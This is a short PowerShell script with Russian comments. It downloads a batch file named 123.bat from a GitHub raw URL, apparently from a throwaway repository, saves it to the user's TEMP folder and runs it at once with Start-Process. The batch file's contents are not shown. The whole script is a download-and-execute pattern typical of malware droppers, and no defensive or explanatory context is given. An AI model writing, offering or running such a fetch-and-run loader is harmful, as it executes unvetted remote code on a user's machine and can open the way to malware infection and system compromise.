# Указываем URL и путь к сохранению
$url = "https://github.com/asakwaza/HHIHIASHDI1test/raw/refs/heads/main/123.bat"
$output = "$env:TEMP\123.bat"

# Скачиваем файл
Invoke-WebRequest -Uri $url -OutFile $output

# Открываем файл
Start-Process $output